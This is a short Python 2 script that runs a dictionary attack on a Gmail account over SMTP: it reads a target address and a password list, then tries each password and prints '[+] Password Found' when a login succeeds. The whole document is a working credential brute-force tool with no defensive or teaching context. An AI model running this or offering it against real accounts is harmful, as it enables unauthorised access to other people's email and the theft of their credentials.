import smtplib



smtpObj = smtplib.SMTP("smtp.gmail.com" , 587)
smtpObj.ehlo()
smtpObj.starttls()


user = raw_input("Enter the email address: ")

passwfile = raw_input("Enter the password file name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
    try:
        smtpObj.login(user, password)

        print "[+] Password Found: %s" % password

        break;

    except smtplib.SMTPAuthenticationError:
        print "[!] Password Incorrect: %s" % password




